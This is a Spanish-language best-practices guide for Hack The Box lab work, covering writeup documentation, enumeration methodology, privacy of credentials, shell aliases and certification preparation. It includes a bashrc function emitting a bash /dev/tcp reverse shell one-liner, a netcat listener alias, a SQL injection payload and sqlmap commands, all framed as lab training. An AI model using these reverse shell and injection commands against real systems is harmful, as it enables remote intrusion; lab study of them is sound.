# ✨ Best Practices - Mejores Prácticas en HTB

Guía de buenas prácticas para maximizar tu aprendizaje en Hack the Box.

---

## 📝 Documentación

### 1. Documenta Mientras Trabajas

❌ **MAL:**
```
Realicé la máquina, ahora voy a documentar todo de memoria
```

✅ **BIEN:**
```
Abro mi editor de notas mientras exploto la máquina
Anoto cada comando y resultado en tiempo real
```

**Beneficio:** No olvidas detalles, documentación más precisa.

### 2. Incluye Screenshots/Evidencia

**Qué evidenciar:**
- [ ] Output de nmap con puertos abiertos
- [ ] Página web vulnerable
- [ ] SQL injection funcionando
- [ ] Shell obtenido
- [ ] Escalada de privilegios
- [ ] Flags capturadas

**Herramientas:**
```bash
# Linux
scrot -s              # Screenshot seleccionado
gnome-screenshot      # GUI screenshot

# macOS
cmd + shift + 4       # Screenshot seleccionado
```

### 3. Explica el "Por Qué"

❌ **Mal:**
```markdown
## Explotación
Ejecuté sqlmap y funcionó. Obtuve acceso.
```

✅ **Bien:**
```markdown
## Explotación

**Vulnerabilidad:** SQL Injection en parámetro `id` de login.php

**Por qué es vulnerable:**
La aplicación no sanitiza la entrada del usuario. 
La consulta SQL es:
SELECT * FROM users WHERE id = [INPUT]

Si ingresamos: 1' OR '1'='1
Se convierte en: SELECT * FROM users WHERE id = 1' OR '1'='1
Que retorna TODOS los usuarios.

**Técnica MITRE:** T1190 - Exploit Public-Facing Application

**Resultado:** Credenciales admin obtenidas
```

### 4. Estructura Consistente

Cada writeup debe tener:
- [ ] Información general (Dificultad, IP, SO)
- [ ] Fases PETS completas
- [ ] Tácticas MITRE ATT&CK
- [ ] Comandos documentados
- [ ] Lecciones aprendidas
- [ ] Referencias

---

## 🔍 Metodología de Trabajo

### 1. Comienza Siempre por Reconocimiento Pasivo

**Flujo Correcto:**
```
1. Reconocimiento Pasivo (0-5 min)
   └─ Información pública del objetivo

2. Enumeración (10-30 min)
   └─ Escaneo activo y detallado

3. Análisis (5-10 min)
   └─ Revisar qué encontraste

4. Explotación (10-60 min)
   └─ Ejecutar el ataque

5. Post-Explotación (5-20 min)
   └─ Escalada y limpieza
```

**Nunca** saltes al escaneo agresivo de inmediato.

### 2. Sé Sistemático

```bash
# BIEN: Documentar resultados
nmap -p- --open 10.10.11.x -oA recon/nmap_all_ports
nmap -sV -sC 10.10.11.x -oA recon/nmap_detailed

# MAL: Ejecutar comandos al azar
nmap 10.10.11.x
nmap 10.10.11.x -A
nmap -sU 10.10.11.x
# Desorden y resultados inconsistentes
```

### 3. Mantén Archivo de Progreso

```markdown
# Máquina: Lame [Easy]
## Estado: En Progreso

### Timeline
- [x] 00:00 - Conectado a VPN
- [x] 05:00 - Reconocimiento pasivo completado
- [x] 15:00 - Nmap completado
- [x] 30:00 - SQL injection identificada
- [ ] 45:00 - Acceso obtenido
- [ ] 60:00 - Escalada completada
```

---

## 🛡️ Seguridad y Privacidad

### 1. Nunca Subas Información Sensible

❌ **NO hagas esto:**
```
curl http://target.com?username=admin&password=password123
# 👆 Credenciales reales visibles en writeup
```

✅ **Haz esto:**
```
curl http://target.com?username=<USERNAME>&password=<PASSWORD>
```

### 2. Repositorio Privado vs Público

**Para máquinas ACTIVAS:**
- Repositorio PRIVADO
- No publicar writeups de máquinas activas
- HTB veta cuentas por esto

**Para máquinas RETIRED:**
- Repositorio PÚBLICO
- OK publicar writeups
- Verificar política de HTB

### 3. Credenciales en Git

Usar `.gitignore` para excluir:
```
credentials.txt
.env
secrets/
config.local
htb_api_key.txt
```

---

## 🧠 Aprendizaje Efectivo

### 1. Aprende Conceptos, No Solo Comandos

❌ **Mal:**
```
$ sqlmap -u "http://..." --dbs
# Memorizó comando, no entiende SQL injection
```

✅ **Bien:**
```
1. ¿Qué es SQL injection?
2. ¿Cómo funciona?
3. ¿Por qué este parámetro es vulnerable?
4. ¿Cómo sqlmap lo explotó?
5. ¿Cómo defenderme de esto?
```

### 2. Haz Máquinas Sin Ayuda

**Primer intento:** Sin mirar soluciones
- Dedica 30-60 minutos
- Prueba diferentes enfoques
- Comete errores (es normal)

**Si te atascas:**
- Repasa tus notas
- Consulta MITRE ATT&CK
- Lee HackTricks
- **Último recurso:** Video de IppSec

### 3. Practica Escribiendo Exploits

**Progresión:**
```
Nivel 1: Usar herramientas existentes (sqlmap, metasploit)
   ↓
Nivel 2: Modificar exploits existentes
   ↓
Nivel 3: Escribir exploits básicos (bash, python)
   ↓
Nivel 4: Escribir exploits complejos
```

### 4. Revisa Otros Writeups

**Después de terminar:**
- Lee otros writeups de la misma máquina
- ¿Qué vectores no viste?
- ¿Hay forma más eficiente?
- ¿Nuevas técnicas aprendidas?

---

## 🎯 Optimización del Tiempo

### 1. Usa Plantillas

```bash
# En vez de empezar de 0 cada vez
cp Tools/HTB_Documentation_Template.md Machines/Easy/MaquinaNew.md
# Edita y completa
```

### 2. Automatiza Enumeración

```bash
#!/bin/bash
# Crea script reusable
TARGET=$1
nmap -p- --open $TARGET -oA nmap_all
nmap -sV -sC $TARGET -oA nmap_detailed
gobuster dir -u http://$TARGET -w wordlist.txt
nikto -h http://$TARGET
```

Uso:
```bash
./enumerate.sh 10.10.11.123
```

### 3. Mantén Comandos Rápidos

```bash
# .bash_aliases
alias nmap-fast='nmap --top-ports 1000'
alias nmap-full='nmap -p- --open -sV -sC -A'
alias gobuster-quick='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50'
alias nc-listen='rlwrap nc -lvnp'
```

### 4. Agrupa Máquinas por Tema

```
Machines/
├── Web/
│   ├── SQL_Injection/
│   ├── XSS/
│   └── Upload/
├── Linux/
│   ├── SUID/
│   ├── Sudo/
│   └── Kernel/
└── Windows/
    ├── UAC/
    ├── Privilege_Escalation/
    └── Credential_Access/
```

Esto facilita encontrar técnicas similares después.

---

## 📊 Progreso y Motivación

### 1. Tracking de Máquinas

```markdown
| Máquina | Dificultad | Tiempo | Estado | Fecha |
|---------|-----------|--------|--------|-------|
| Lame | Easy | 45 min | ✅ | 2024-01-15 |
| Legacy | Easy | 30 min | ✅ | 2024-01-16 |
| Blue | Easy | 60 min | ✅ | 2024-01-17 |
```

### 2. Establece Metas Realistas

**MAL:**
"Voy a hacer 50 máquinas en un mes"

**BIEN:**
"Voy a hacer 1-2 máquinas por semana con documentación completa"

### 3. Celebra Logros

- ✅ Completada máquina Easy
- ✅ Primer privesc conseguido
- ✅ Primer RCE
- ✅ Primera máquina Medium
- ✅ Repositorio con 10 máquinas

---

## 🔧 Herramientas y Automatización

### 1. Crea Snippets Personalizados

```bash
# ~/.bashrc
# Reverse shell una-liner
bash-revshell() {
  echo "bash -i >& /dev/tcp/$1/$2 0>&1"
}

# SQLmap rápido
sqlmap-quick() {
  sqlmap -u "$1" --dbs --batch
}
```

Uso:
```bash
bash-revshell 10.10.14.123 4444
sqlmap-quick "http://target.com/login.php?id=1"
```

### 2. Crea Scripts de Setup

```bash
#!/bin/bash
# setup.sh - Setup rápido para máquina HTB

TARGET=$1
mkdir -p $TARGET/{nmap,web,privesc,notes}
cd $TARGET

# Escaneo inicial
nmap -p- --open $TARGET -oA nmap/all_ports
nmap -sV -sC $TARGET -oA nmap/detailed

echo "Setup completado en $TARGET/"
```

### 3. Usa Version Control

```bash
git add .
git commit -m "✅ Máquina completada: Lame [Easy] - SQL Injection"
git push

# Esto = portafolio profesional
```

---

## 🎓 Certificaciones

### Prepararse para Certificaciones

**Máquinas para CEH:**
- OSCP-style machines
- Enfoque en privilege escalation

**Máquinas para OSCP:**
- Medium/Hard machines
- Custom writeups sin hint

**Máquinas para Security+:**
- Concepto fundamentales
- Networking basics

---

## 🚀 Habilidades Avanzadas

### 1. Desarrolla Intuición

Con experiencia:
- Ves puerto 445 → "Probablemente SMB vulnerable"
- Ves login web → "Testear SQL injection"
- Encuentras wordpress → "Enumerar plugins/temas"

### 2. Piensa Como Atacante

**Antes:**
"¿Qué hace nmap aquí?"

**Después:**
"¿Qué puedo explotar de esto?"

### 3. Escala Dificultad Gradualmente

```
Semana 1-2: Easy machines (SQL injection, RCE básico)
Semana 3-4: Easy + algunos Medium (SUID, kernel)
Semana 5+: Mix de Medium/Hard
Semana 10+: Enfoque en máquinas tipo OSCP
```

---

## 💡 Tips Finales

1. **Persistencia:** No abandones después de 1 intento
2. **Documentación:** Tu futuro yo te agradecerá
3. **Comunidad:** Lee writeups de otros, aprende
4. **Prácticas:** Repite técnicas en diferentes máquinas
5. **Enseña:** Escribir explicaciones = aprender mejor
6. **Diversidad:** No hagas solo máquinas web o Linux
7. **CTFs:** Participa en competencias si puedes

---

<div align="center">

### 🎯 Recuerda

**La calidad de documentación = Calidad de aprendizaje**

**Cada máquina es una oportunidad de aprender algo nuevo**

**Tu portafolio es tu mejor entrevista**

</div>
